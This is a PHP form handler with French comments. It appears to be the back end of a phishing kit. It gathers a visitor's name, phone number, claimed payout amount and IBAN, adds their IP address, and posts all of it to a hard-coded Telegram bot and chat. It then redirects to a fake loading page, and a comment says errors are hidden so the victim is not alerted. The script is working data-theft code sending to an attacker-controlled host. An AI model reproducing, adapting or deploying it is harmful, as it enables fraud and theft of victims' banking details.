<?php
// Inclure la bibliothèque Telegram Bot API
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $name = $_POST["name"];
    $tel = $_POST["tel"];
    $montant = $_POST["montant"];
    $iban = $_POST["iban"];

    // Initialiser l'API de Telegram avec votre jeton d'API
    $telegram = new Telegram('6844528973:AAHY1U17RfQEesD-LCqs8U1tD1a6x28EzJk');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "📨 Nouvelle soumission We :\n\n";
    $message .= "👤 Nom et prénom(s): $name\n";
    $message .= "📞 Numéro de téléphone: $tel\n";
    $message .= "💰 Montant à recevoir: $montant\n";
    $message .= "🏦 IBAN: $iban\n";
    $message .= "⏰ Date: " . date('Y-m-d H:i:s') . "\n";
    $message .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'] . "\n";

    // L'ID du chat où vous voulez envoyer le message
    $chatId = '1142771792';

    // Envoyer le message à Telegram
    try {
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
        ];

        $response = Request::sendMessage($data);
        
        // Rediriger l'utilisateur vers la page de confirmation
        header("Location: ./chargement1.html");
        exit();
        
    } catch (Exception $e) {
        error_log("Erreur Telegram: " . $e->getMessage());
        // En cas d'erreur, rediriger quand même pour ne pas alerter l'utilisateur
        header("Location: ./index.html");
        exit();
    }
} else {
    echo "Méthode non autorisée.";
}
?>